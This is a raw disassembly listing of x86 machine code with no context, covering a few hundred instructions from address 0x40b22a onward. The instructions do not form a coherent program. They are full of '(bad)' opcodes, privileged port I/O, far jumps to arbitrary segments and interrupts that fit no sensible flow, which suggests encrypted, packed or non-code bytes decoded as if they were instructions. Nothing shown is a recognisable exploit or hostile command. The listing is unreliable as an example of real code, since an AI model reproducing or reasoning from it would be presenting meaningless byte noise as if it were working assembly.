  40b22a:	data16 or ch,al
  40b22d:	not    dh
  40b22f:	and    BYTE PTR [ebx+0x39e4394d],ah
  40b235:	pushf  
  40b236:	ins    BYTE PTR es:[edi],dx
  40b237:	fld    st(7)
  40b239:	push   ebx
  40b23a:	hlt    
  40b23b:	cmp    eax,0x15f33a2a
  40b240:	xchg   ebx,eax
  40b241:	mov    DWORD PTR [ecx+0x74],edi
  40b244:	jge    0x40b1f6
  40b246:	jg     0x40b1f1
  40b248:	push   edi
  40b249:	cld    
  40b24a:	sbb    ebx,DWORD PTR fs:[ebx-0x7c]
  40b24e:	enter  0x1643,0xd2
  40b252:	sahf   
  40b253:	fcom   DWORD PTR [ebx+0x20]
  40b256:	add    al,0x58
  40b258:	pop    esi
  40b259:	pop    ds
  40b25a:	in     al,dx
  40b25b:	pusha  
  40b25c:	add    ch,BYTE PTR [ebx+0x4f]
  40b25f:	xor    esi,DWORD PTR [esp+ebp*4-0x6116e837]
  40b266:	gs pop es
  40b268:	add    al,0x2b
  40b26a:	into   
  40b26b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b26c:	push   ds
  40b26d:	mov    ds:0x6b132578,eax
  40b272:	test   bh,ah
  40b274:	and    esi,eax
  40b276:	xor    al,0x7b
  40b278:	sub    ebx,DWORD PTR [ebp+0x7b08a749]
  40b27e:	dec    edi
  40b27f:	js     0x40b28c
  40b281:	punpcklwd mm4,DWORD PTR [eax]
  40b284:	imul   DWORD PTR [edx+0x20]
  40b287:	ins    DWORD PTR es:[edi],dx
  40b288:	mov    cl,0xcd
  40b28a:	jmp    0xf6df:0x64e2abdf
  40b291:	call   0x312b:0x2964062e
  40b298:	jnp    0x40b303
  40b29a:	sub    DWORD PTR [esi+0x3e892750],edx
  40b2a0:	loopne 0x40b27d
  40b2a2:	xchg   cx,ax
  40b2a4:	test   eax,0xcd54aefd
  40b2a9:	(bad)  
  40b2ac:	jle    0x40b258
  40b2ae:	test   DWORD PTR [esi+ecx*4-0x5d],esp
  40b2b2:	rcr    ecx,cl
  40b2b4:	fidiv  WORD PTR ss:[edx]
  40b2b7:	repnz push ebx
  40b2b9:	es ret 0xb467
  40b2bd:	sub    BYTE PTR [eax+0x2201f593],dl
  40b2c3:	mov    al,ds:0xf9e7d58c
  40b2c8:	cmp    eax,0x5352fe3f
  40b2cd:	ss mov esp,0xc47f9a5b
  40b2d3:	scas   eax,DWORD PTR es:[edi]
  40b2d4:	sub    DWORD PTR [ecx-0x27],0x1aa97e80
  40b2db:	add    eax,0x7d57bf5d
  40b2e0:	push   ebp
  40b2e1:	int    0x69
  40b2e3:	(bad)  
  40b2e5:	and    eax,0xb970229f
  40b2ea:	xlat   BYTE PTR ds:[ebx]
  40b2eb:	sbb    al,0x7f
  40b2ed:	dec    edi
  40b2ee:	jae    0x40b343
  40b2f0:	das    
  40b2f1:	jmp    0x40b2ff
  40b2f3:	jl     0x40b314
  40b2f5:	mov    edx,DWORD PTR [edi-0x56]
  40b2f8:	mov    cl,BYTE PTR [edi+0x1fc2d0dc]
  40b2fe:	push   eax
  40b300:	cmp    BYTE PTR [edx-0x3f],ch
  40b303:	xor    DWORD PTR [ebx+ebx*4-0x6baee786],0xbc34601d
  40b30e:	shl    edx,1
  40b310:	test   BYTE PTR [ebp+0x7e530372],dh
  40b316:	jno    0x40b337
  40b318:	mov    eax,ds:0x7c2da171
  40b31d:	imul   esi,ecx,0x70618090
  40b323:	sti    
  40b324:	inc    ebx
  40b325:	jp     0x40b380
  40b327:	cld    
  40b328:	xchg   BYTE PTR [ebx],ch
  40b32a:	inc    esp
  40b32b:	cwde   
  40b32c:	gs ja  0x40b2c8
  40b32f:	or     BYTE PTR [esi],ah
  40b331:	(bad)  
  40b332:	in     al,dx
  40b333:	rcr    dl,1
  40b335:	inc    ebp
  40b336:	div    BYTE PTR [eax]
  40b338:	shl    BYTE PTR [esi],1
  40b33a:	add    al,0x5b
  40b33c:	scas   eax,DWORD PTR es:[edi]
  40b33d:	sub    ch,dl
  40b33f:	test   al,0x53
  40b341:	(bad)  
  40b342:	sbb    ecx,esi
  40b344:	push   es
  40b345:	lods   al,BYTE PTR ds:[esi]
  40b346:	or     bl,BYTE PTR [ebx+ebx*2]
  40b349:	imul   esi,DWORD PTR [eax+ebp*4+0xe],0x52343e43
  40b351:	mov    eax,0xf0cf2a0a
  40b356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b357:	hlt    
  40b358:	inc    edi
  40b359:	jmp    0x1773:0x69a22a5a
  40b360:	mov    al,BYTE PTR [esi+0x7e9d1188]
  40b366:	jns    0x40b36a
  40b368:	mov    ecx,0x9245580a
  40b36d:	xor    ebx,DWORD PTR ds:[ecx]
  40b370:	aas    
  40b371:	jnp    0x40b3d6
  40b373:	les    ebp,FWORD PTR [edx+0x51]
  40b376:	xor    DWORD PTR [esi+0x1c219e53],esi
  40b37c:	add    BYTE PTR [edx+0x6ab9f68b],0x66
  40b383:	mov    ecx,0x97c1f4df
  40b388:	rol    bl,0x67
  40b38b:	(bad)  
  40b38c:	nop
  40b38d:	popf   
  40b38e:	imul   esp,DWORD PTR [edx],0x4b468554
  40b394:	pop    ebp
  40b395:	dec    edi
  40b396:	jbe    0x40b347
  40b398:	sub    ch,BYTE PTR [ebx]
  40b39a:	dec    ebx
  40b39b:	inc    esi
  40b39c:	mov    eax,0x53821275
  40b3a1:	pop    edx
  40b3a2:	rcl    BYTE PTR [edi],0x30
  40b3a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3a6:	scas   al,BYTE PTR es:[edi]
  40b3a7:	add    eax,ebx
  40b3a9:	outs   dx,BYTE PTR ds:[esi]
  40b3aa:	mov    ds,WORD PTR [ecx]
  40b3ac:	mov    ds:0x1a31b24b,al
  40b3b1:	sbb    DWORD PTR [edx],0x48
  40b3b4:	push   edx
  40b3b5:	jl     0x40b354
  40b3b7:	adc    DWORD PTR [ebx+ecx*4-0x80],0xffffffdf
  40b3bc:	sub    eax,esp
  40b3be:	pusha  
  40b3bf:	sbb    BYTE PTR [ecx+0x670a4d04],al
  40b3c5:	loop   0x40b365
  40b3c7:	cmp    ah,BYTE PTR [eax-0x12]
  40b3ca:	(bad)  
  40b3cc:	push   ebx
  40b3cd:	ror    ebp,0xb8
  40b3d0:	repz pop ecx
  40b3d2:	mov    ds:0x1cb22aba,eax
  40b3d7:	cmp    eax,0x99904946
  40b3dc:	mov    dh,0x7e
  40b3de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3df:	xor    ch,BYTE PTR ds:0xf1cc6586
  40b3e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3e6:	loop   0x40b379
  40b3e8:	int    0x83
  40b3ea:	or     al,0x77
  40b3ec:	and    BYTE PTR [ebx+0x41],al
  40b3ef:	mov    ch,0xa3
  40b3f1:	ins    DWORD PTR es:[edi],dx
  40b3f2:	mov    ebp,0xcf6abf0f
  40b3f7:	jmp    0x40b3bd
  40b3f9:	call   0x249:0x6fe452f7
  40b400:	sbb    eax,ebp
  40b402:	and    al,0x19
  40b404:	pop    ecx
  40b405:	jns    0x40b46a
  40b407:	sbb    BYTE PTR [esi+0x69],bh
  40b40a:	pop    edi
  40b40b:	in     eax,0x3e
  40b40d:	mov    bh,BYTE PTR [ecx+0x79061fc4]
  40b413:	pop    esi
  40b414:	call   0x4b51:0x6bd855c
  40b41b:	lods   al,BYTE PTR ds:[esi]
  40b41c:	setbe  BYTE PTR [ecx+0x24]
  40b420:	icebp  
  40b421:	cmp    ch,BYTE PTR [esi]
  40b423:	sub    DWORD PTR [edi-0x6183ed97],ebp
  40b429:	jbe    0x40b3b6
  40b42b:	xlat   BYTE PTR ds:[ebx]
  40b42c:	pop    ss
  40b42d:	add    al,0x55
  40b42f:	mov    ebp,0x72e5fb0b
  40b434:	inc    ecx
  40b435:	imul   edi,DWORD PTR [ebp+0x23724b73],0xd7e25333
  40b43f:	inc    esi
  40b440:	jg     0x40b3fe
  40b442:	cmp    BYTE PTR [edi-0x70],bl
  40b445:	push   0x3f
  40b447:	ins    DWORD PTR es:[edi],dx
  40b448:	xor    BYTE PTR [edi],bl
  40b44a:	in     eax,dx
  40b44b:	or     BYTE PTR [ebp+0x46],al
  40b44e:	in     al,dx
  40b44f:	pop    eax
  40b450:	pop    edx
  40b451:	and    al,BYTE PTR [ecx+0x4d]
  40b454:	xchg   edx,eax
  40b455:	imul   ebp,esp,0xa8f82f5c
  40b45b:	sbb    DWORD PTR [ebp+0x4cfa9548],eax
  40b461:	and    eax,0x5451cea9
  40b466:	adc    cl,BYTE PTR [ebx]
  40b468:	iret   
  40b469:	jns    0x40b4c3
  40b46b:	js     0x40b4a1
  40b46d:	fcomp  QWORD PTR [ebp+edi*4+0x70]
  40b471:	and    eax,DWORD PTR [edx+0x58]
  40b474:	pusha  
  40b475:	dec    esi
  40b476:	shr    DWORD PTR es:[ebx],cl
  40b479:	sbb    bh,BYTE PTR [ecx-0x73]
  40b47c:	push   ecx
  40b47d:	add    ah,ah
  40b47f:	sbb    bh,dl
  40b481:	out    0x80,eax
  40b483:	sbb    DWORD PTR [ebx],eax
  40b485:	jnp    0x40b496
  40b487:	jne    0x40b4c6
  40b489:	pop    ds
  40b48a:	into   
  40b48b:	xchg   esp,eax
  40b48c:	push   ebx
  40b48d:	std    
  40b48e:	pop    esp
  40b48f:	push   edx
  40b490:	jmp    0x40b4c9
  40b492:	pop    es
  40b493:	call   0x4f53:0x5908d16d
  40b49a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b49b:	arpl   si,si
  40b49d:	xchg   BYTE PTR [ebx],ch
  40b49f:	mov    al,0x53
  40b4a1:	pop    esp
  40b4a2:	cmp    esp,DWORD PTR [eax]
  40b4a4:	enter  0x15bb,0x10
  40b4a8:	(bad)  
  40b4aa:	rol    DWORD PTR [ebp+0x37],cl
  40b4ad:	out    dx,al
  40b4ae:	out    dx,eax
  40b4af:	mov    al,ds:0x1b7d97ad
  40b4b4:	aad    0x0
  40b4b6:	aad    0x99
  40b4b8:	iret   
  40b4b9:	lea    ebp,ds:0x4e6ad709
  40b4bf:	mov    al,ds:0x680495ed
  40b4c4:	or     al,0x72
  40b4c6:	jle    0x40b53e
  40b4c8:	push   es
  40b4c9:	jo     0x40b47d
  40b4cb:	pop    ecx
  40b4cc:	loop   0x40b4eb
  40b4ce:	sbb    edx,DWORD PTR [eax+0x6a54d9e1]
  40b4d4:	push   ebx
  40b4d5:	(bad)  
  40b4d6:	dec    ebp
  40b4d7:	loope  0x40b4bc
  40b4d9:	cmp    al,0xd3
  40b4db:	outs   dx,DWORD PTR ds:[esi]
  40b4dc:	mov    WORD PTR [ecx+0x7e],gs
  40b4df:	fs push ebp
  40b4e1:	inc    edx
  40b4e2:	mov    eax,ecx
  40b4e4:	pop    ss
  40b4e5:	xor    al,0x19
  40b4e7:	cmp    al,0xcd
  40b4e9:	ret    0x8da6
  40b4ec:	popf   
  40b4ed:	test   BYTE PTR [ecx-0x6094f4b8],dl
  40b4f3:	fs cmc 
  40b4f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4f6:	aam    0xae
  40b4f8:	xchg   esp,eax
  40b4f9:	or     eax,0x49563a66
  40b4fe:	stos   BYTE PTR es:[edi],al
  40b4ff:	mov    ebp,0x185e27a6
  40b504:	retf   0x93e8
  40b507:	(bad)  
  40b508:	mov    ebp,0x53510f64
  40b50d:	xchg   esp,eax
  40b50e:	nop
  40b50f:	sub    BYTE PTR cs:[esi],cl
  40b512:	mov    WORD PTR [eax],ss
  40b514:	dec    ebp
  40b515:	imul   edi,DWORD PTR [esi],0xabb39f20
  40b51b:	cmp    eax,0xe666e5ef
  40b520:	sar    DWORD PTR [ecx-0x8],cl
  40b523:	sahf   
  40b524:	xchg   ecx,eax
  40b525:	cld    
  40b526:	mov    ecx,0xa8b121d0
  40b52b:	cmp    edx,edx
  40b52d:	shl    DWORD PTR [ebx+ebx*2+0x55],0x52
  40b532:	ja     0x40b583
  40b534:	push   ebx
  40b535:	jge    0x40b595
  40b537:	ins    BYTE PTR es:[edi],dx
  40b538:	adc    BYTE PTR [edi+0x6952f85d],dh
  40b53e:	mov    dl,0xef
  40b540:	jbe    0x40b4f0
  40b542:	cmp    al,BYTE PTR [ebx+edi*8]
  40b545:	dec    ebp
  40b546:	jns    0x40b541
  40b548:	rcr    DWORD PTR [edx],1
  40b54a:	cmc    
  40b54b:	in     eax,0xcb
  40b54d:	ins    DWORD PTR es:[edi],dx
  40b54e:	dec    esi
  40b54f:	sbb    BYTE PTR [eax+0x3c72dd87],cl
  40b555:	outs   dx,BYTE PTR ds:[esi]
  40b556:	mov    edx,ebp
  40b558:	push   ebx
  40b559:	add    DWORD PTR [ecx],ebp
  40b55b:	sub    eax,0x6bebfbd0
  40b560:	retf   
  40b561:	push   0x2c
  40b563:	outs   dx,BYTE PTR ds:[esi]
  40b564:	gs ds add al,0x15
  40b568:	inc    ecx
  40b569:	cmp    ecx,esi
  40b56b:	hlt    
  40b56c:	ss call 0xd76b4fd8
  40b572:	scas   eax,DWORD PTR es:[edi]
  40b573:	repnz and BYTE PTR [esi],bh
  40b576:	cmc    
  40b577:	sbb    ebp,ebx
  40b579:	inc    edx
  40b57a:	retf   0xe25b
  40b57d:	mov    edi,DWORD PTR [eax-0x74]
  40b580:	outs   dx,DWORD PTR ds:[si]
  40b582:	aaa    
  40b583:	sbb    dl,bl
  40b585:	arpl   WORD PTR [edi],ax
  40b587:	popf   
  40b588:	push   edx
  40b589:	fdivr  DWORD PTR [ebx+ebx*1-0x50]
  40b58d:	sar    BYTE PTR [edi-0x1975d05c],1
  40b593:	in     eax,0x53
  40b595:	stos   BYTE PTR es:[edi],al
  40b596:	jnp    0x40b57d
  40b598:	mov    esp,0x624264c
  40b59d:	imul   esp,DWORD PTR [eax+0x70b9b30],0xfffffff1
  40b5a4:	xchg   esp,eax
  40b5a5:	push   esi
  40b5a6:	gs daa 
  40b5a8:	sbb    cl,BYTE PTR [ecx-0x6a]
  40b5ab:	jno    0x40b5b4
  40b5ad:	mov    bl,0xf4
  40b5af:	mul    DWORD PTR [esi+0x69]
  40b5b2:	mov    al,ds:0xaff84e7
  40b5b7:	mul    DWORD PTR [esi]
  40b5b9:	cli    
  40b5ba:	data16 scas al,BYTE PTR es:[edi]
  40b5bc:	inc    edx
  40b5bd:	xchg   BYTE PTR [edi-0x33a2dfa3],ch
  40b5c3:	sbb    DWORD PTR [ecx-0x5e],ebx
  40b5c6:	retf   
  40b5c7:	and    BYTE PTR [edx+0x55a0091a],ch
  40b5cd:	or     eax,0x6c09bce0
  40b5d2:	fst    st(2)
  40b5d4:	dec    edx
  40b5d5:	inc    esi
  40b5d6:	mov    ds:0x71697bd9,al
  40b5db:	ja     0x40b5d1
  40b5dd:	data16 clc 
  40b5df:	je     0x40b646
  40b5e1:	inc    esi
  40b5e2:	jno    0x40b61a
  40b5e4:	ds sbb dl,dh
  40b5e7:	shl    DWORD PTR [ebx+0x12],cl
  40b5ea:	adc    edx,ecx
  40b5ec:	pop    ss
  40b5ed:	imul   ecx,DWORD PTR [ecx+0x286f74e7],0x4c
  40b5f4:	or     al,0xf6
  40b5f6:	xchg   dx,ax
  40b5f8:	bound  esi,QWORD PTR [esi]
  40b5fa:	lock in eax,0x7f
  40b5fd:	add    dl,BYTE PTR [edi+0x18]
  40b600:	jecxz  0x40b650
  40b602:	loop   0x40b5af
  40b604:	add    eax,0x53dd3507
  40b609:	jbe    0x40b5ca
  40b60b:	lahf   
  40b60c:	pop    es
  40b60d:	sub    DWORD PTR [edx],esp
  40b60f:	sbb    eax,0x9cda698e
  40b614:	push   0xffffffc7
  40b616:	sbb    DWORD PTR [ebp+0x5879bef2],esp
  40b61c:	int    0x8f
  40b61e:	mov    cl,0x43
  40b620:	jae    0x40b67e
  40b622:	neg    BYTE PTR [ecx]
  40b624:	dec    edx
  40b625:	sbb    DWORD PTR [ecx+0x7e],edx
  40b628:	addr16 adc bh,bh
  40b62b:	std    
  40b62c:	push   edx
  40b62d:	push   edx
  40b62e:	adc    esp,edi
  40b630:	sbb    eax,0x471f5d69
  40b635:	idiv   BYTE PTR [edx+0x7686d919]
  40b63b:	inc    ebp
  40b63c:	jns    0x40b601
  40b63e:	imul   ebp,DWORD PTR gs:[ebx-0x1fe7a129],0x92a5aa89
  40b649:	mov    ds:0xbb3919fc,al
  40b64e:	mov    eax,esp
  40b650:	xor    bl,BYTE PTR [edx]
  40b652:	call   0xbd380a41
  40b657:	inc    eax
  40b658:	and    BYTE PTR [edi+0x4f3facee],al
  40b65e:	inc    ebx
  40b65f:	test   al,0xe
  40b661:	jmp    0x40b5ea
  40b663:	cwde   
  40b664:	sbb    ebx,DWORD PTR [edx-0x6d]
  40b667:	xor    dl,BYTE PTR [ebx+0x63]
  40b66a:	push   edi
  40b66b:	test   BYTE PTR [esi-0x57],0x60
  40b66f:	bound  eax,QWORD PTR [edi]
  40b671:	imul   esp,DWORD PTR [ebx+0x4584ee7e],0xffffffae
  40b678:	inc    esi
  40b679:	mov    DWORD PTR [edx],ecx
  40b67b:	(bad)  
  40b67c:	es inc eax
  40b67e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b67f:	xchg   edx,ebp
  40b681:	mov    bl,0xbd
  40b683:	inc    edi
  40b684:	lods   eax,DWORD PTR ds:[esi]
  40b685:	mov    ebx,0xc861b17
  40b68a:	add    ebp,DWORD PTR [edi-0x19edb585]
  40b690:	push   ebp
  40b691:	ror    BYTE PTR [eax-0x41],cl
  40b694:	loope  0x40b6a0
  40b696:	xor    BYTE PTR [edi-0x11],bh
  40b699:	mov    al,ds:0xca4b185f
  40b69e:	lock mov ah,0xba
  40b6a1:	outs   dx,DWORD PTR ds:[esi]
  40b6a2:	rcl    DWORD PTR [esi-0x38cd2eb4],1
  40b6a8:	popa   
  40b6a9:	frstor [esi-0x34]
  40b6ac:	pushf  
  40b6ad:	xor    eax,ebx
  40b6af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6b0:	jecxz  0x40b659
  40b6b2:	push   edx
  40b6b3:	sbb    bh,al
  40b6b5:	xchg   esi,eax
  40b6b6:	scas   eax,DWORD PTR es:[edi]
  40b6b7:	sahf   
  40b6b8:	pop    edx
  40b6b9:	mov    ch,0x79
  40b6bb:	cmp    BYTE PTR [ebx-0x7c],bh
  40b6be:	xor    BYTE PTR [ebx+eiz*2+0x4480599b],0x6a
  40b6c6:	lock pop ecx
  40b6c8:	mov    eax,0xa84d5014
  40b6cd:	je     0x40b748
  40b6cf:	mov    BYTE PTR [edi-0x53ff06ab],bl
  40b6d5:	mov    bh,0x5
  40b6d7:	sbb    edx,DWORD PTR [eax]
  40b6d9:	add    ah,BYTE PTR [esi+0x5d]
  40b6dc:	sub    BYTE PTR [eax+0x244c61e6],cl
  40b6e2:	jne    0x40b689
  40b6e4:	or     eax,0x3a722965
  40b6e9:	sub    edi,ebp
  40b6eb:	fld    TBYTE PTR [ebp-0x3c]
  40b6ee:	scas   al,BYTE PTR es:[edi]
  40b6ef:	and    eax,DWORD PTR [edi+0x2c]
  40b6f2:	call   0x2bf9:0xfb7dcc93
  40b6f9:	dec    ebx
  40b6fa:	shl    esi,1
  40b6fc:	into   
  40b6fd:	and    BYTE PTR [esi-0x59],ah
  40b700:	and    BYTE PTR [esi+edx*1],0xac
  40b704:	out    0x2d,al
  40b706:	jmp    0x40b721
  40b708:	out    0xf,eax
  40b70a:	stc    
  40b70b:	outs   dx,DWORD PTR ds:[esi]
  40b70c:	loopne 0x40b71e
  40b70e:	dec    eax
  40b70f:	pop    eax
  40b710:	push   ebx
  40b711:	mov    ecx,0x5b7c8901
  40b716:	and    ecx,DWORD PTR [eax+0x58276950]
  40b71c:	hlt    
  40b71d:	mov    bh,0xe7
  40b71f:	retf   
  40b720:	xor    al,BYTE PTR [edi+0x52]
  40b723:	mov    esp,0xe607455
  40b728:	cmp    ebp,edx
  40b72a:	ins    BYTE PTR es:[edi],dx
  40b72b:	jg     0x40b6d6
  40b72d:	scas   al,BYTE PTR es:[edi]
  40b72e:	nop
  40b72f:	sbb    edi,edx
  40b731:	leave  
  40b732:	mov    al,0xf8
  40b734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b735:	inc    esi
  40b736:	fcomp  QWORD PTR [esi+0x66]
  40b739:	jo     0x40b728
  40b73b:	inc    esp
  40b73c:	rcr    ebx,cl
  40b73e:	cmp    eax,0x28d71be2
  40b743:	sbb    DWORD PTR [esi+0x546aba35],esi
  40b749:	stc    
  40b74a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40b74c:	push   ebx
  40b74d:	sbb    ebp,ebx
  40b74f:	jg     0x40b709
  40b751:	and    eax,DWORD PTR [eax-0x3e94f389]
  40b757:	mov    ds:0x3ada0745,al
  40b75c:	shl    BYTE PTR [esi+eiz*2],0xd6
  40b760:	pusha  
  40b761:	rcr    BYTE PTR [edi-0x7eeac81d],1
  40b767:	lods   al,BYTE PTR ds:[esi]
  40b768:	stos   DWORD PTR es:[edi],eax
  40b769:	mov    al,0xe7
  40b76b:	not    DWORD PTR [edx+0x22]
  40b76e:	sub    BYTE PTR [esi-0x2186a66c],cl
  40b774:	push   0xffffff86
  40b776:	add    dl,BYTE PTR [edx]
  40b778:	lahf   
  40b779:	push   ds
  40b77a:	pop    ebp
  40b77b:	sub    DWORD PTR [ecx],esi
  40b77d:	add    ecx,edi
  40b77f:	mov    edi,0x491b1d19
  40b784:	push   ebx
  40b785:	pop    esp
  40b786:	cli    
  40b787:	hlt    
  40b788:	loopne 0x40b7ed
  40b78a:	sar    edx,1
  40b78c:	inc    esp
  40b78d:	cs sbb al,0xcb
  40b790:	sar    DWORD PTR [esi-0x6c],cl
  40b793:	pop    esp
  40b794:	mov    dl,0x1a
  40b796:	inc    eax
  40b797:	adc    dl,BYTE PTR [eax+0x41]
  40b79a:	std    
  40b79b:	dec    esi
  40b79c:	cmp    BYTE PTR [esi],cl
  40b79e:	les    ebx,FWORD PTR [ecx+0x1b71c0d0]
  40b7a4:	repnz inc edi
  40b7a6:	div    cl
  40b7a8:	sub    DWORD PTR [edx+0x75bfa318],eax
  40b7ae:	jns    0x40b79b
  40b7b0:	dec    eax
  40b7b1:	popf   
  40b7b2:	cmp    esp,DWORD PTR [edi+ebp*2]
  40b7b5:	leave  
  40b7b6:	sbb    ebp,DWORD PTR fs:[eax-0x46]
  40b7ba:	call   0x5337:0x5920ffaf
  40b7c1:	push   cs
  40b7c2:	ret    
  40b7c3:	cmp    cl,ah
  40b7c5:	fsub   st(5),st
  40b7c7:	inc    eax
  40b7c8:	or     BYTE PTR [ebx+0x4c],ch
  40b7cb:	int3   
  40b7cc:	fdiv   DWORD PTR [ebx+0x3]
  40b7cf:	add    al,0xdd
  40b7d1:	push   ebp
  40b7d2:	push   si
  40b7d4:	push   ss
  40b7d5:	imul   esp,esp,0x9a70b8
  40b7db:	sbb    ebx,ecx
  40b7dd:	rcr    eax,0x31
  40b7e0:	cmp    eax,0x5305269d
  40b7e5:	add    cl,BYTE PTR [edi+0x3392cd76]
  40b7eb:	dec    edx
  40b7ec:	test   BYTE PTR [ecx+0x5a],ch
  40b7ef:	cmp    eax,0x433144fc
  40b7f4:	pop    esi
  40b7f5:	sar    DWORD PTR [eax],0x5b
  40b7f8:	inc    eax
  40b7f9:	cmp    ah,BYTE PTR [esi-0xd]
  40b7fc:	add    edi,esp
  40b7fe:	sub    eax,0x2f96890c
  40b803:	sbb    DWORD PTR [esi+0x78af3d74],esp
  40b809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b80a:	or     edx,DWORD PTR [eax+0x61]
  40b80d:	push   ds
  40b80e:	rcl    dl,1
  40b810:	push   ebx
  40b811:	cmp    cl,BYTE PTR [eax-0x2d]
  40b814:	out    0xb6,eax
  40b816:	mov    ss,esi
  40b818:	in     eax,dx
  40b819:	in     al,dx
  40b81a:	dec    esp
  40b81b:	inc    ebx
  40b81c:	or     al,0xee
  40b81e:	fsubrp st(5),st
  40b820:	xor    cl,BYTE PTR [eax+0x60]
  40b823:	xchg   edi,eax
  40b824:	push   ebx
  40b825:	ror    BYTE PTR [ebx],0xc7
  40b828:	rcr    dh,0x46
  40b82b:	cli    
  40b82c:	mov    edx,0x871bc607
  40b831:	push   eax
  40b832:	and    al,0x19
  40b834:	(bad)  [edi+0x58]
  40b837:	inc    edx
  40b838:	cmp    al,0xe4
  40b83a:	gs mov ecx,0x625a2214
  40b840:	adc    edx,DWORD PTR [ecx+0x69aa1a5c]
  40b846:	je     0x40b8b6
  40b848:	aad    0x66
  40b84a:	push   ebx
  40b84b:	aam    0xa9
  40b84d:	mov    esi,0x3a526dec
  40b852:	out    0x9b,eax
  40b854:	and    DWORD PTR [edi+0x58],esi
  40b857:	fbld   TBYTE PTR [ebx]
  40b859:	scas   al,BYTE PTR es:[edi]
  40b85a:	mov    ecx,0xe6fa7cdd
  40b85f:	lock cmp BYTE PTR es:[ebp+esi*1-0x19],bh
  40b865:	mov    eax,0xf1295167
  40b86a:	(bad)  
  40b86c:	imul   ebp,DWORD PTR [ecx+0x4a8f519],0xa35bbd9e
  40b876:	xchg   BYTE PTR [ecx-0x3449352d],bh
  40b87c:	push   ebx
  40b87d:	and    BYTE PTR [eax-0x5b],dl
  40b880:	cdq    
  40b881:	cmova  esp,DWORD PTR [edi-0x357ff5a]
  40b888:	aas    
  40b889:	cmp    DWORD PTR [bx+si],eax
  40b88c:	stos   BYTE PTR es:[edi],al
  40b88d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b88e:	sbb    al,0x3d
  40b890:	sbb    bl,BYTE PTR [edi+eiz*1+0x5]
  40b894:	mov    dl,al
  40b896:	sbb    DWORD PTR [ebx],esp
  40b898:	(bad)  [edi]
  40b89a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b89b:	lahf   
  40b89c:	ja     0x40b88b
  40b89e:	lds    eax,FWORD PTR [edx+0x7b]
  40b8a1:	mov    eax,0x6aed1651
  40b8a6:	mov    WORD PTR [esi-0x135983ba],gs
  40b8ac:	jne    0x40b8b4
  40b8ae:	jns    0x40b887
  40b8b0:	xlat   BYTE PTR ds:[ebx]
  40b8b1:	xor    BYTE PTR [ecx-0x4e],0x45
  40b8b5:	sub    al,0x81
  40b8b7:	sbb    DWORD PTR [ebx+0x38464ac],ebx
  40b8bd:	dec    esi
  40b8be:	inc    edx
  40b8bf:	and    DWORD PTR [edx-0x2b],edx
  40b8c2:	add    al,BYTE PTR [ebx-0x44625e90]
  40b8c8:	inc    edi
  40b8c9:	jne    0x40b881
  40b8cb:	sbb    ebp,esi
  40b8cd:	lea    ebx,[esi+0x34]
  40b8d0:	add    BYTE PTR [ecx],ch
  40b8d2:	ja     0x40b8e3
  40b8d4:	push   ebx
  40b8d5:	les    ecx,FWORD PTR [ebp-0xcfa4a09]
  40b8db:	add    bh,al
  40b8dd:	add    DWORD PTR [ebx+0x49334777],ebx
  40b8e3:	sub    edi,ecx
  40b8e5:	dec    eax
  40b8e6:	pop    ecx
  40b8e7:	add    DWORD PTR [ecx],esi
  40b8e9:	mov    bh,0x48
  40b8eb:	inc    esp
  40b8ec:	xchg   DWORD PTR [edx-0x6a98c665],edx
  40b8f2:	push   edx
  40b8f3:	push   ds
  40b8f4:	sub    DWORD PTR [ecx-0x2d],0x37c6b0e7
  40b8fb:	gs into 
  40b8fd:	pop    edi
  40b8fe:	push   di
  40b900:	push   esi
  40b901:	cmc    
  40b902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b903:	imul   ebx,DWORD PTR [edi+0x65],0x2325a20f
  40b90a:	rcl    bh,1
  40b90c:	jo     0x40b8e8
  40b90e:	cwde   
  40b90f:	sbb    bl,cl
  40b911:	outs   dx,DWORD PTR ds:[esi]
  40b912:	scas   eax,DWORD PTR es:[edi]
  40b913:	rcr    BYTE PTR [ebx],1
  40b915:	pop    ecx
  40b916:	call   0xc1a3:0x76a95e79
  40b91d:	jle    0x40b998
  40b91f:	mov    ds:0xfcaac3a6,al
  40b924:	stc    
  40b925:	mov    esi,0x2de519cb
  40b92a:	int3   
  40b92b:	stc    
  40b92c:	xchg   ebx,eax
  40b92d:	(bad)  
  40b92e:	mov    ds:0x65544fe3,eax
  40b933:	inc    ecx
  40b934:	in     al,dx
  40b935:	inc    esi
  40b936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b937:	ss int 0x6c
  40b93a:	fcomp  DWORD PTR [ecx]
  40b93c:	mov    ebp,edi
  40b93e:	rcl    BYTE PTR [ecx],cl
  40b940:	je     0x40b919
  40b942:	xor    DWORD PTR ds:0x18269d53,ebx
  40b948:	cmp    DWORD PTR [ebx-0x7b],0x38
  40b94c:	scas   al,BYTE PTR es:[edi]
  40b94d:	xchg   ebp,eax
  40b94e:	pop    es
  40b94f:	cmc    
  40b950:	iret   
  40b951:	cli    
  40b952:	xchg   edx,eax
  40b953:	sbb    DWORD PTR [eax+0x4d],edx
  40b956:	xor    eax,0x67e35790
  40b95b:	sti    
  40b95c:	popa   
  40b95d:	jl     0x40b932
  40b95f:	mov    dh,BYTE PTR [eax-0x54]
  40b962:	inc    esp
  40b963:	clc    
  40b964:	not    BYTE PTR [edi+0x29]
  40b967:	lods   al,BYTE PTR ds:[esi]
  40b968:	jg     0x40b8ee
  40b96a:	das    
  40b96b:	xchg   esp,eax
  40b96c:	push   ebx
  40b96d:	sub    eax,0xce34272
  40b972:	sub    al,0x28
  40b974:	shr    DWORD PTR [edx+0x60],0x31
